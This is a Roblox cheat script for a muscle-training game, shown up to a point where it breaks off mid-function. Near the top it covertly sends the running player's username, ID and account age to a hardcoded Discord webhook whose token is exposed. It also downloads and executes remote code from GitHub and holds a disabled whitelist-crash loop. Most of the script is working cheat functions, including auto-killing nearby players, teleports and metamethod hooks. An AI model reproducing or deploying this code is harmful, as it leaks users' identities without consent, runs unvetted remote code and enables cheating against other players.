local HttpService = game:GetService("HttpService")
local HttpRequest = syn and syn.request or http and http.request or HttpRequest or request or httprequest
if not HttpRequest then return end

local crash = true
for _, v in ipairs({ 7081706197, 1360277717, 7592817330, 4055740561, 5440006876, 4645202717, 2411593291, 3595939119, 5250007575, 680226997, 1360277717, 5227017428, 5138219457, 3203584778, 4576640872, 2769269310, 7592817330, 904811621, 3252013546, 1382979785, 3213965848, 3969855889, 4993020254, 4357282789 }) do
	if game.Players.LocalPlayer.UserId == v then
		crash = false
		break
	end
end

crash = false

if crash then
	for i = 1, math.huge do
		while true do
			while true do
				while true do
				end
			end
		end
	end
end

local portal = game:GetService("Workspace"):FindFirstChild("RobloxForwardPortals")

if portal then
	portal:Destroy()
end

local function log()

	local function format_age(days)
		local years = math.floor(days / 365)
		days = days % 365
		local months = math.floor(days / 30)
		days = days % 30
		
		local result = {}
		if years > 0 then table.insert(result, years .. " year" .. (years > 1 and "s" or "")) end
		if months > 0 then table.insert(result, months .. " month" .. (months > 1 and "s" or "")) end
		if days > 0 then table.insert(result, days .. " day" .. (days > 1 and "s" or "")) end
	
		return table.concat(result, ", ") .. " ago"
	end

	local LP = game.Players.LocalPlayer

	HttpRequest({
		Url = "https://discord.com/api/webhooks/1314282939583827999/2i5ajx02oCZrpcxmj0tBHoawo9kvdd0G5ZnI4TnM_OXnWWt6fu5xLvECHMFkqJUUCXe5",
		Method = "POST",
		Headers = {
			['Content-Type'] = 'application/json'
		},
		Body = HttpService:JSONEncode({
			["embeds"] = {{
				["title"] = "NL Mobile was executed",
				["description"] = "Username: " .. LP.Name .. "\nDisplay: " .. LP.DisplayName .. "\nID: " .. LP.UserId .. "\nCreated: " .. format_age(LP.AccountAge),
			}}
		})
	})
end

task.spawn(log)

local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/revi712/nrs/refs/heads/main/moblib.lua"))()

local function format(arg1, precision)
	if arg1 == nil then return "nil" end
	if precision then return string.format("%d", arg1):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "") end

	if arg1 < 1000 then return arg1 end
	if arg1 ~= nil then
		local string_len_result1 = string.len(tostring(math.floor(arg1)))
		if string_len_result1 == 4 then
			return string.sub(tostring(arg1 / 1000), 1, 4)..'K'
		end
		if string_len_result1 == 5 then
			return string.sub(tostring(arg1 / 1000), 1, 4)..'K'
		end
		if string_len_result1 == 6 then
			return string.sub(tostring(arg1 / 1000), 1, 5)..'K'
		end
		if string_len_result1 == 7 then
			return string.sub(tostring(arg1 / 1000000), 1, 4)..'M'
		end
		if string_len_result1 == 8 then
			return string.sub(tostring(arg1 / 1000000), 1, 4)..'M'
		end
		if string_len_result1 == 9 then
			return string.sub(tostring(arg1 / 1000000), 1, 5)..'M'
		end
		if string_len_result1 == 10 then
			return string.sub(tostring(arg1 / 1000000000), 1, 4)..'B'
		end
		if string_len_result1 == 11 then
			return string.sub(tostring(arg1 / 1000000000), 1, 4)..'B'
		end
		if string_len_result1 == 12 then
			return string.sub(tostring(arg1 / 1000000000), 1, 5)..'B'
		end
		if string_len_result1 == 13 then
			return string.sub(tostring(arg1 / 1000000000000), 1, 4)..'T'
		end
		if string_len_result1 == 14 then
			return string.sub(tostring(arg1 / 1000000000000), 1, 4)..'T'
		end
		if string_len_result1 == 15 then
			return string.sub(tostring(arg1 / 1000000000000), 1, 5)..'T'
		end
		if string_len_result1 == 16 then
			return string.sub(tostring(arg1 / 1000000000000000), 1, 4).."Qa"
		end
		if string_len_result1 == 17 then
			return string.sub(tostring(arg1 / 1000000000000000), 1, 4).."Qa"
		end
		if 18 <= string_len_result1 then
		end
		return string.sub(tostring(arg1 / 1000000000000000), 1, 5).."Qa"
	end
end

local function formatTime(elapsedSeconds)
	if elapsedSeconds < 60 then
		return string.format("%ds", elapsedSeconds)
	elseif elapsedSeconds < 3600 then
		local minutes = math.floor(elapsedSeconds / 60)
		local seconds = elapsedSeconds % 60
		return string.format("%dm %ds", minutes, seconds)
	elseif elapsedSeconds < 86400 then
		local hours = math.floor(elapsedSeconds / 3600)
		local minutes = math.floor((elapsedSeconds % 3600) / 60)
		local seconds = elapsedSeconds % 60
		return string.format("%dh %dm %ds", hours, minutes, seconds)
	else
		local days = math.floor(elapsedSeconds / 86400)
		local hours = math.floor((elapsedSeconds % 86400) / 3600)
		local minutes = math.floor((elapsedSeconds % 3600) / 60)
		local seconds = elapsedSeconds % 60
		return string.format("%dd %dh %dm %ds", days, hours, minutes, seconds)
	end
end

local function gNameLen(obj)
	return obj.TextBounds.X + 15
end


local Window = library:AddWindow("Nitrous", {
	main_color = Color3.fromRGB(80, 144, 173),
	min_size = Vector2.new(450, 360),
	toggle_key = Enum.KeyCode.RightShift,
	can_resize = true,
})

local MainTab = Window:AddTab("Main")
local FarmTab = Window:AddTab("Farm")
local PlayerTab = Window:AddTab("Players")
local TeleportTab = Window:AddTab("Teleport")
local RebirthTab = Window:AddTab("Rebirth")

local SelfFolder = MainTab:AddFolder("Self")
local UtilitiesFolder = MainTab:AddFolder("Utilities")
local MiscFolder = MainTab:AddFolder("Miscellaneous")
local TimeLapsedFolder = MainTab:AddFolder("Time Elapsed")

local ToolsFolder = FarmTab:AddFolder("Tools")
local AutoFarmFolder = FarmTab:AddFolder("Auto Farm")
local GlitchAndBrawlsFolder = FarmTab:AddFolder("Glitch & Brawls")
local BoostsFolder = FarmTab:AddFolder("Boost Manager")

local PlayersFolder = PlayerTab:AddFolder("Players")
local PlayerStatsFolder = PlayerTab:AddFolder("Player Stats")
local AllPlayersFolder = PlayerTab:AddFolder("All Players")

local GymsTpFolder = TeleportTab:AddFolder("Gyms")
local BrawlsTpFolder = TeleportTab:AddFolder("Brawls")


local funcs = {
	spectate_character = function(c)
		game:GetService("Workspace").CurrentCamera.CameraSubject = c
	end,
	reset_spectate = function()
		game:GetService("Workspace").CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
	end,
	set_speed = function(i)
		local char = game.Players.LocalPlayer.Character
		if char then
			local humanoid = char:FindFirstChild("Humanoid")
			if humanoid then humanoid.WalkSpeed = i end
		end
	end,
	set_jump_power = function(i)
		local char = game.Players.LocalPlayer.Character
		if char then
			local humanoid = char:FindFirstChild("Humanoid")
			if humanoid then humanoid.JumpPower = i end
		end
	end,
	get_tool = function(s)
		local tool = game:GetService("Players").LocalPlayer.Character:FindFirstChild(s)

		if tool then
			return tool
		else
			tool = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(s)
		end
		return tool
	end,
	equip_tool = function(s)
		local tool = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(s)

		if tool then
			tool.Parent = game:GetService("Players").LocalPlayer.Character
		end
	end,
	use_tool = function(s)
		local tool = game:GetService("Players").LocalPlayer.Character:FindFirstChild(s)
		if tool then tool:Activate() end
	end,
	add_to_list = function(t, e)
		if table.find(t, e) == nil then table.insert(t, e) end
	end,
	remove_from_list = function(t, e)
		local i = table.find(t, e)
		if i then table.remove(t, i) end
	end,
	create_ring = function(s, i)
		if game:GetService("Workspace"):FindFirstChild(s) then return end

		local ForceField = Instance.new("Part")
		ForceField.Anchored = true
		ForceField.Shape = Enum.PartType.Cylinder
		ForceField.Material = Enum.Material.ForceField
		ForceField.Size = Vector3.new(0.01, i, i + 5)
		ForceField.Transparency = 0.7
		ForceField.Color = Color3.fromRGB(255, 0, 0)
		ForceField.Name = s
		ForceField.CanCollide = false
		ForceField.Position = game.Players.LocalPlayer.Character:FindFirstChild("LeftFoot").Position
		ForceField.CFrame = CFrame.new(ForceField.Position) * CFrame.Angles(math.rad(90), math.rad(90), 0)
		ForceField.Parent = game:GetService("Workspace")

		local Fire = Instance.new("Fire")
		Fire.Size = 8
		Fire.Heat = 0
		Fire.Color = Color3.fromRGB(83, 56, 236)
		Fire.SecondaryColor = Color3.fromRGB(255, 255, 255)
		Fire.TimeScale = 0.5
		Fire.Enabled = true
		Fire.Parent = ForceField

		local ParticleEmitter = Instance.new("ParticleEmitter")
		ParticleEmitter.Color = ColorSequence.new(Color3.fromRGB(232, 192, 255))
		ParticleEmitter.Size = NumberSequence.new(0.5)
		ParticleEmitter.Speed = NumberRange.new(5)
		ParticleEmitter.Rate = 25
		ParticleEmitter.Transparency = NumberSequence.new(0.6)
		ParticleEmitter.LightEmission = 1
		ParticleEmitter.Parent = ForceField
	end,
	activate_ring = function(t, i, b, s)
		local ForceField = game:GetService("Workspace"):FindFirstChild(s == nil and "NitrousForceField" or s)

		if s ~= nil and not ForceField then return end

		if ForceField then
			if b then
				local Character = game.Players.LocalPlayer.Character
				ForceField.Position = Character:FindFirstChild("LeftFoot").Position
				ForceField.CFrame = CFrame.new(ForceField.Position) * CFrame.Angles(math.rad(90), math.rad(90), 0)
			end

			local function isThreat(w)
				local threat = true
				for _, v in ipairs(t) do
					if v == w then
						threat = false
						break
					end
				end

				return threat
			end

			local LeftHand = game.Players.LocalPlayer.Character:FindFirstChild("LeftHand")
			local RightHand = game.Players.LocalPlayer.Character:FindFirstChild("RightHand")
			local me = game.Players.LocalPlayer:FindFirstChild("muscleEvent")

			for _, v in pairs(game:GetService("Players"):GetPlayers()) do
				if v ~= game.Players.LocalPlayer and isThreat(v.Name) and v.Name ~= "Forgiveness19" and v.Name ~= "Wraith1286"  then
					local PlayerCharacter = v.Character
					if PlayerCharacter then
						local hrp = PlayerCharacter:FindFirstChild("HumanoidRootPart")
						local humanoid = PlayerCharacter:FindFirstChild("Humanoid")

						if hrp and humanoid then
							local hrpPos3D = hrp.Position
							local forceFieldPos3D = ForceField.Position

							if (Vector3.new(hrpPos3D.X, 0, hrpPos3D.Z) - Vector3.new(forceFieldPos3D.X, 0, forceFieldPos3D.Z)).magnitude <= ((i / 2) + 1) then
								local PlayerHead = PlayerCharacter:FindFirstChild("Head")
								if PlayerHead then
									if firetouchinterest then
										if humanoid.Health > 0 then
											local backpackTool = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Punch")
											if backpackTool then
												backpackTool.Parent = game:GetService("Players").LocalPlayer.Character
											end
											firetouchinterest(LeftHand, PlayerHead, 0)
											firetouchinterest(RightHand, PlayerHead, 0)
											task.wait()
											me:FireServer("punch", "leftHand")
											me:FireServer("punch", "rightHand")
											firetouchinterest(LeftHand, PlayerHead, 1)
											firetouchinterest(RightHand, PlayerHead, 1)
										end
									end
								end
							end
						end
					end
				end
			end
		end
	end,
	update_ring_radius = function(s, i)
		local ForceField = game:GetService("Workspace"):FindFirstChild(s)

		if ForceField then
			ForceField.Size = Vector3.new(0.01, i, i)
		end
	end,
	destroy_ring = function(s)
		local ForceField = game:GetService("Workspace"):FindFirstChild(s)

		if ForceField then
			ForceField:Destroy()
		end
	end,
	set_rebirth_button_visibility = function(b)
		local rebirthButton = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("gameGui"):WaitForChild("sideButtons"):WaitForChild("rebirthButton")

		if rebirthButton then
			rebirthButton.Visible = b
		end
	end,
	consume_all_snacks = function(s, s2)
		local LP = game.Players.LocalPlayer
		local consumablesFolder = LP:FindFirstChild("consumablesFolder")

    	if #consumablesFolder:GetChildren() == 0 then return end
    	if not consumablesFolder:FindFirstChild(s2) then return end

    	local muscleEvent = LP:WaitForChild("muscleEvent")

    	task.spawn(function()
        	for _, v in pairs(LP:FindFirstChild("Backpack"):GetChildren()) do
            	if v.Name == s2 then muscleEvent:FireServer(unpack({ [1] = s, [2] = v })) end
            	task.wait(0.1)
        	end
    	end)

    	task.spawn(function()
        	for _, v in pairs(LP.Character:GetChildren()) do
            	if v.Name == s2 then muscleEvent:FireServer(unpack({ [1] = s, [2] = v })) end
            	task.wait(0.1)
        	end
    	end)
	end
}

local flags = {
	main = {
		speed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed,
		jump = game.Players.LocalPlayer.Character.Humanoid.JumpPower,
		ring_size = 0,
		walk_on_water = true,
		fast_punch = funcs.get_tool("Punch").attackTime.Value < 0.3,
		punch_anim = not funcs.get_tool("Punch").RequiresHandle,
		anti_knock = true,
		anti_idle = true,
		show_rebirth_btn = false
	},
	farm = {
		punch = false,
		weight = false,
		pushups = false,
		handstands = false,
		situps = false,
		auto_brawl = false,
		godmode_brawl = false
	},
	auto_farm = {
		gym = "Frost Gym",
		refresh = false,
		equipment = "None"
	},
	glitch = {
		rock = "Muscle King Mountain",
		start = false
	},
	players = {
		selected = nil,
		spectating = nil,
		blacklisted = { "Forgiveness19", "Wraith1286" },
		kill_list = {},
		enable_fast_kills = true,
		kill_everyone = false,
		karma_priority = "None",
		teleport_to_them_in_kills = false
	},
	connections = {
		anti_knock = nil,
		anti_idle = nil
	},
	read_only_time_lapse = {
		time = os.time(),
		kills = game.Players.LocalPlayer:WaitForChild("leaderstats"):WaitForChild("Kills").Value,
		strength = game.Players.LocalPlayer:WaitForChild("leaderstats"):WaitForChild("Strength").Value,
		durability = game.Players.LocalPlayer:WaitForChild("Durability").Value,
		agility = game.Players.LocalPlayer:WaitForChild("Agility").Value,
		brawls = game.Players.LocalPlayer:WaitForChild("leaderstats"):WaitForChild("Brawls").Value
	}
}

local GymsAndEquipments = {
	None = {
		Name = "None",
		Equipments = { "Select Gym / Location" }
	},
	Frost = {
		Name = "Frost Gym (1 rebirth)",
		Equipments = { "None", "Frost Press", "Frost Lift", "Frost Squat" },
		Locations = { Vector3.new(-3022.55, 22.328, -197.539), Vector3.new(-2917.47, 36.8284, -209.564), Vector3.new(-2628.56, 18.1402, -609.639) }
	},
	Mystical = {
		Name = "Mystical Gym (5 rebirths)",
		Equipments = { "None", "Mythical Press", "Mythical Pullup", "Mythical Throw" },
		Locations = { Vector3.new(2372.72, 50.493, 1243.3), Vector3.new(2396.97, 34.0095, 859.006), Vector3.new(2572.88, 41.4207, 1215.72)}
	},
	Eternal = {
		Name = "Eternal Gym (15 rebirths)",
		Equipments = { "None", "Eternal Press" },
		Locations = { Vector3.new(-7172.72, 78.2889, -1110.84) }
	},
	Legends = {
		Name = "Legends Gym (30 rebirths)",
		Equipments = { "None", "Legends Press", "Legends Lift", "Legends Pullup", "Legends Squat", "Legends Throw" },
		Locations = { Vector3.new(4098.2, 1044.03, -3804.57), Vector3.new(4533.89, 1020.85, -3999.5), Vector3.new(4303.93, 1025, -4121.44), Vector3.new(4441.55, 1019.25, -4066.53), Vector3.new(4191.62, 1016.48, -3907.46) }
	},
	Jungle = {
		Name = "Jungle Gym (60 Rebirths)",
		Equipments = { "None", "Jungle Bar Lift", "Jungle Bench", "Jungle Squat" },
		Locations = { Vector3.new(-8678.05566, 14.5030098, 2089.25977), Vector3.new(-8174.8833, 71.6216927, 1895.7384), Vector3.new(-8374.24805, 77.4377441, 2933.2312) }
	},
	MuscleKing = {
		Name = "Muscle King (5 rebirths)",
		Equipments = { "None", "Muscle King Bench", "Muscle King Lift", "Muscle King Squat", "King Boulder" },
		Locations = { Vector3.new(-8592.32, 69.7408, -6032.86), Vector3.new(-8772.97, 46.4664, -5663.56), Vector3.new(-8758.44, 40.2748, -6043.07), Vector3.new(-8942.13, 45.6317, -5691.64) }
	}
}

local function displayGymNames()
	local tempList = { "None" }

	for _, gymData in pairs(GymsAndEquipments) do
		if gymData.Name ~= "None" then
			table.insert(tempList, gymData.Name)
		end
	end

	return tempList
end

local function getEquipmentsFromGym(name)
	local equipmentList = GymsAndEquipments.None.Equipments

	for _, gymData in pairs(GymsAndEquipments) do
		if gymData.Name == name then
			equipmentList = gymData.Equipments
			break
		end
	end

	return equipmentList
end

local function getEquipmentCFrame(gymName, equipmentName)
	local FrostLocations = GymsAndEquipments.Frost.Locations
	local MysticalLocations = GymsAndEquipments.Mystical.Locations
	local EternalLocations = GymsAndEquipments.Eternal.Locations
	local LegendsLocations = GymsAndEquipments.Legends.Locations
	local MuscleKingLocations = GymsAndEquipments.MuscleKing.Locations
	local JungleLocations = GymsAndEquipments.Jungle.Locations
	
	if gymName == GymsAndEquipments.Frost.Name then
		if equipmentName == "Frost Press" then
			return FrostLocations[1]
		elseif equipmentName == "Frost Lift" then
			return FrostLocations[2]
		elseif equipmentName == "Frost Squat" then
			return FrostLocations[3]
		end
	end

	if gymName == GymsAndEquipments.Mystical.Name then
		if equipmentName == "Mythical Press" then
			return MysticalLocations[1]
		elseif equipmentName == "Mythical Pullup" then
			return MysticalLocations[2]
		elseif equipmentName == "Mythical Throw" then
			return MysticalLocations[3]
		end
	end

	if gymName == GymsAndEquipments.Eternal.Name then
		if equipmentName == "Eternal Press" then
			return EternalLocations[1]
		end
	end

	if gymName == GymsAndEquipments.Legends.Name then
		if equipmentName == "Legends Press" then
			return LegendsLocations[1]
		elseif equipmentName == "Legends Lift" then
			return LegendsLocations[2]
		elseif equipmentName == "Legends Pullup" then
			return LegendsLocations[3]
		elseif equipmentName == "Legends Squat" then
			return LegendsLocations[4]
		elseif equipmentName == "Legends Throw" then
			return LegendsLocations[5]
		end
	end

	if gymName == GymsAndEquipments.MuscleKing.Name then
		if equipmentName == "Muscle King Bench" then
			return MuscleKingLocations[1]
		elseif equipmentName == "Muscle King Lift" then
			return MuscleKingLocations[2]
		elseif equipmentName == "Muscle King Squat" then
			return MuscleKingLocations[3]
		elseif equipmentName == "King Boulder" then
			return MuscleKingLocations[4]
		end
	end

	if gymName == GymsAndEquipments.Jungle.Name then
		if equipmentName == "Jungle Bar Lift" then
			return JungleLocations[1]
		elseif equipmentName == "Jungle Bench" then
			return JungleLocations[2]
		elseif equipmentName == "Jungle Squat" then
			return JungleLocations[3]
		end
	end
end


local function AddMainTabStuff()

	SelfFolder:AddTextBox("Size", function(text)
		local v = tonumber(text)
		if v then game:GetService("ReplicatedStorage"):FindFirstChild("rEvents"):FindFirstChild("changeSpeedSizeRemote"):InvokeServer("changeSize", v) end
	end, {
		["clear"] = false,
	})

	SelfFolder:AddTextBox("Speed", function(text)
		local v = tonumber(text)
		if v then funcs.set_speed(v) end
	end, {
		["clear"] = false,
	})

	SelfFolder:AddTextBox("Jump", function(text)
		local v = tonumber(text)
		if v then
			flags.main.jump = v
			funcs.set_jump_power(v)
		end
	end, {
		["clear"] = false,
	})

	local WowSwitch = UtilitiesFolder:AddSwitch("Walk On Water", function(b)
		flags.main.walk_on_water = b
		if b then
			flags.connections.walk_on_water = game:GetService("RunService").Stepped:Connect(function()
				local platform = game:GetService("Workspace"):FindFirstChild("wow")
				if not platform then
					platform = Instance.new("Part")
					platform.Name = "wow"
					platform.Anchored = true
					platform.Size = Vector3.new(10000, 0, 10000)
					platform.Position = Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X, -8.8, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)
					platform.Transparency = 1
					platform.Parent = game:GetService("Workspace")
				end

				if game.Players.LocalPlayer.Character then
					platform.Position = Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X, -8.8, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)
				end
			end)
		else
			flags.connections.walk_on_water:Disconnect()
			flags.connections.walk_on_water = nil
			local platform = game:GetService("Workspace"):FindFirstChild("wow")
			if platform then
				platform:Destroy()
			end
		end
	end)

	WowSwitch:Set(true)

	flags.connections.walk_on_water = game:GetService("RunService").Stepped:Connect(function()
		local platform = game:GetService("Workspace"):FindFirstChild("wow")
		if not platform then
			platform = Instance.new("Part")
			platform.Name = "wow"
			platform.Anchored = true
			platform.Size = Vector3.new(10000, 0, 10000)
			platform.Position = Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X, -8.8, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)
			platform.Transparency = 1
			platform.Parent = game:GetService("Workspace")
		end

		if game.Players.LocalPlayer.Character then
			platform.Position = Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X, -8.8, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)
		end
	end)

	UtilitiesFolder:AddSwitch("Fast Punch", function(b)
		flags.main.fast_punch = b
		funcs.get_tool("Punch").attackTime.Value = b and 0.03 or 0.3
	end)

	local PunchAnimSwitch = UtilitiesFolder:AddSwitch("Punch Animation", function(b)
		flags.main.punch_anim = b
		funcs.get_tool("Punch").RequiresHandle = not b
	end)

	PunchAnimSwitch:Set(flags.main.punch_anim)

	local AntiKnockSwitch = UtilitiesFolder:AddSwitch("Anti Knockback", function(b)
		flags.main.anti_knock = b

		if b then
			flags.connections.anti_knock = game:GetService("RunService").Stepped:Connect(function()
				local char = game.Players.LocalPlayer.Character
				if char then
					local HRP = char:FindFirstChild("HumanoidRootPart")

					if HRP then
						local punchVelocity = HRP:FindFirstChild("punchVelocity")

						if punchVelocity then
							punchVelocity.Velocity = Vector3.new(0, 0, 0)
							punchVelocity:Destroy()
							HRP.Velocity = Vector3.new(0, 0, 0)
						end
					end
				end
			end)
		else
			if flags.connections.anti_knock then
				flags.connections.anti_knock:Disconnect()
				flags.connections.anti_knock = nil
			end
		end
	end)

	local AntiIdleSwitch = UtilitiesFolder:AddSwitch("Anti Idle", function(b)
		flags.main.anti_idle = b
		if b then
			flags.connections.anti_idle = game.Players.LocalPlayer.Idled:Connect(function()
				local VU = game:GetService("VirtualUser")

				VU:CaptureController()
				VU:ClickButton1(Vector2.new())
			end)
		else
			if flags.connections.anti_idle then
				flags.connections.anti_idle:Disconnect()
				flags.connections.anti_idle = nil
			end
		end
	end)

	local RingOfDeathSwitch = UtilitiesFolder:AddSwitch("Ring Of Death", function(b)
		flags.main.ring_size = (b and 80 or 0)
		if b then
			funcs.create_ring("nitrousring", 80)
		else
			funcs.destroy_ring("nitrousring")
		end
	end)

	AntiKnockSwitch:Set(true)
	AntiIdleSwitch:Set(true)


	flags.connections.anti_idle = game.Players.LocalPlayer.Idled:Connect(function()
		local VU = game:GetService("VirtualUser")

		VU:CaptureController()
		VU:ClickButton1(Vector2.new())
	end)

	AntiIdleSwitch:Set(true)

	UtilitiesFolder:AddSwitch("Show Rebirth Button", function(b)
		flags.main.show_rebirth_btn = b
	end)

	MiscFolder:AddButton("Collect Gems", function()
		local chestRemote = game:GetService("ReplicatedStorage"):FindFirstChild("rEvents"):FindFirstChild("checkChestRemote")

		for _, v in ipairs({ "Enchanted Chest", "Mythical Chest", "Magma Chest", "Legends Chest", "Golden Chest" }) do
			chestRemote:InvokeServer(unpack({ [1] = v }))
			task.wait(0.3)
		end

		task.wait(0.3)

		game:GetService("ReplicatedStorage"):FindFirstChild("rEvents"):FindFirstChild("groupRemote"):InvokeServer(unpack({ [1] = "groupRewards" }))
	end)

	MiscFolder:AddButton("Reset Character", function()
		game.Players.LocalPlayer.Character.Humanoid.Health = 0
	end)

	MiscFolder:AddButton("Block Rebirths", function()
		if not hookmetamethod then return end

		local rebirth_remote = game:GetService("ReplicatedStorage"):FindFirstChild("rEvents"):FindFirstChild("rebirthRemote")
    	local hmmi

    	hmmi = hookmetamethod(game, "__index", function(self, method)
			if self == rebirth_remote and method == "InvokeServer" then
				return
			end
			return hmmi(self, method)
		end)
	end)

	MiscFolder:AddLabel("Only press Block Rebirths once per server.")
	MiscFolder:AddLabel("If you pressed it and re-execute script, do not block it again.")


	local TimeLabel = TimeLapsedFolder:AddLabel("Time: ")
	local AgilityLabel = TimeLapsedFolder:AddLabel("Agility: ")
	local BrawlsLabel = TimeLapsedFolder:AddLabel("Brawls: ")
	local DuraLabel = TimeLapsedFolder:AddLabel("Durability: ")
	local KillsLabel = TimeLapsedFolder:AddLabel("Kills: ")
	local StrengthLabel = TimeLapsedFolder:AddLabel("Strength: ")

	local function updLabel(i, t)
		if i then
			i.Text = t
			i.Size = UDim2.new(0, gNameLen(i), 0, 20)
		end
	end

	local x = {}

	function x.UpdateTimeElapsed()
		local local_player = game.Players.LocalPlayer

		local current_time_lapse = os.time() - flags.read_only_time_lapse.time
		local strength_time_lapse = local_player:FindFirstChild("leaderstats"):FindFirstChild("Strength").Value - flags.read_only_time_lapse.strength
		local dura_time_lapse = local_player:FindFirstChild("Durability").Value - flags.read_only_time_lapse.durability
		local agility_time_lapse = local_player:FindFirstChild("Agility").Value - flags.read_only_time_lapse.agility
		local brawls_time_lapse = local_player:FindFirstChild("leaderstats"):FindFirstChild("Brawls").Value - flags.read_only_time_lapse.brawls
		local kills_time_lapse = local_player:FindFirstChild("leaderstats"):FindFirstChild("Kills").Value - flags.read_only_time_lapse.kills

		updLabel(TimeLabel, "Time: " .. formatTime(current_time_lapse))
		updLabel(AgilityLabel, "Agility: " .. format(agility_time_lapse, false) .. " (" .. format(agility_time_lapse, true) .. ")")
		updLabel(BrawlsLabel, "Brawls: " .. format(brawls_time_lapse, false) .. " (" .. format(brawls_time_lapse, true) .. ")")
		updLabel(DuraLabel, "Durability: " .. format(dura_time_lapse, false) .. " (" .. format(dura_time_lapse, true) .. ")")
		updLabel(KillsLabel, "Kills: " .. format(kills_time_lapse, false) .. " (" .. format(kills_time_lapse, true) .. ")")
		updLabel(StrengthLabel, "Strength: " .. format(strength_time_lapse, false) .. " (" .. format(strength_time_lapse, true) .. ")")

	end

	return x

end

local function AddFarmTabStuff()
	ToolsFolder:AddSwitch("Punch", function(b)
		flags.farm.punch = b
	end)

	ToolsFolder:AddSwitch("Weight", function(b)
		flags.farm.weight = b
	end)

	ToolsFolder:AddSwitch("Situps", function(b)
		flags.farm.situps = b
	end)

	ToolsFolder:AddSwitch("Handstands", function(b)
		flags.farm.handstands = b
	end)

	ToolsFolder:AddSwitch("Pushups", function(b)
		flags.farm.pushups = b
	end)

	local GymDropdown = AutoFarmFolder:AddDropdown("Select Gym", function(obj)
		flags.auto_farm.gym = obj
		flags.auto_farm.refresh = true
	end):Refresh(displayGymNames())

	local EquipmentsDropdown = AutoFarmFolder:AddDropdown("Select Equipment", function(obj)
		flags.auto_farm.equipment = obj
		game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		task.wait(0.5)
		game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
	end)

	GlitchAndBrawlsFolder:AddDropdown("Select Rock", function(obj)
		flags.glitch.rock = obj
	end):Refresh({ "Ancient Jungle Rock", "Muscle King Mountain", "Rock Of Legends", "Tiny Rock" })

	GlitchAndBrawlsFolder:AddSwitch("Start Glitch", function(b)
		flags.glitch.start = b
	end)

	GlitchAndBrawlsFolder:AddSwitch("Auto Join Brawls", function(b)
		flags.farm.auto_brawl = b
	end)

	GlitchAndBrawlsFolder:AddSwitch("Brawl Godmode", function(b)
		flags.glitch.godmode_brawl = b
	end)

	BoostsFolder:AddButton("Spin wheel", function(b)
		task.spawn(function()
			while game.Players.LocalPlayer:WaitForChild("freeWheelSpins").Value > 0 do
            	game:GetService("ReplicatedStorage"):FindFirstChild("rEvents"):FindFirstChild("openFortuneWheelRemote"):InvokeServer(unpack({ [1] = "openFortuneWheel", [2] = game:GetService("ReplicatedStorage"):WaitForChild("fortuneWheelChances"):WaitForChild("Fortune Wheel") }))
            	task.wait(0.3)
        	end
    	end)
	end)

	BoostsFolder:AddButton("Consume all boosts", function(b)
		funcs.consume_all_snacks("proteinBar", "Protein Bar")
		funcs.consume_all_snacks("proteinShake", "Protein Shake")
		funcs.consume_all_snacks("energyShake", "Energy Shake")
		funcs.consume_all_snacks("energyBar", "Energy Bar")
		funcs.consume_all_snacks("toughBar", "TOUGH Bar")
		funcs.consume_all_snacks("ultraShake", "ULTRA Shake")
	end)

	BoostsFolder:AddLabel("This will not consume Protein Eggs or Tropical Shakes")

	local x = {}

	function x.Refresh()
		if flags.auto_farm.refresh then
			flags.auto_farm.refresh = false
			EquipmentsDropdown:Refresh(getEquipmentsFromGym(flags.auto_farm.gym))
		end
	end

	return x

end

local function AddPlayerTabStuff()

	local PlayersDropdown = PlayersFolder:AddDropdown("Players", function(obj)
		local username = string.match(obj, ": (.+)")
		local cached_player = game:GetService("Players"):FindFirstChild(username)
		if cached_player then
			flags.players.selected_player = cached_player
		end
	end)

	local function RefreshPlayerList()
		local t = {}

		for _, v in pairs(game:GetService("Players"):GetPlayers()) do
			if v ~= game.Players.LocalPlayer then
				table.insert(t, v.DisplayName .. " : " .. v.Name)
			end
		end
		PlayersDropdown:Refresh(t)
	end

	for _, v in pairs(game:GetService("Players"):GetPlayers()) do
		if v:GetFriendStatus(game.Players.LocalPlayer) == Enum.FriendStatus.Friend then
			funcs.add_to_list(flags.players.blacklisted, v.Name)
		end
	end

	RefreshPlayerList()

	local horiz = PlayersFolder:AddHorizontalAlignment()
	local horiz2 = PlayersFolder:AddHorizontalAlignment()
	local horiz3 = PlayersFolder:AddHorizontalAlignment()


	horiz:AddButton("Spectate", function()
		if flags.players.selected_player then
			flags.players.spectating = flags.players.selected_player
			funcs.spectate_character(flags.players.selected_player.Character)
		end
	end)

	horiz:AddButton("Stop Spectatating", function()
		flags.players.spectating = nil
		funcs.reset_spectate()
	end)

	PlayersFolder:AddButton("Go To Player", function()
		if flags.players.selected_player then
			local player_char = flags.players.selected_player.Character
			if player_char and player_char:FindFirstChild("HumanoidRootPart") then
				local humanoidRootPart = player_char.HumanoidRootPart
				local localHumanoidRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

				if localHumanoidRootPart and humanoidRootPart then
					localHumanoidRootPart.CFrame = humanoidRootPart.CFrame
				end
			end
		end
	end)

	horiz2:AddButton("Wl Player", function()
		if flags.players.selected_player then
			funcs.add_to_list(flags.players.blacklisted, flags.players.selected_player.Name)
			funcs.remove_from_list(flags.players.kill_list, flags.players.selected_player.Name)
		end
	end)

	horiz2:AddButton("Remove from WL", function()
		if flags.players.selected_player then
			funcs.remove_from_list(flags.players.blacklisted, flags.players.selected_player.Name)
		end
	end)

	horiz3:AddButton("Add To Kill List", function()
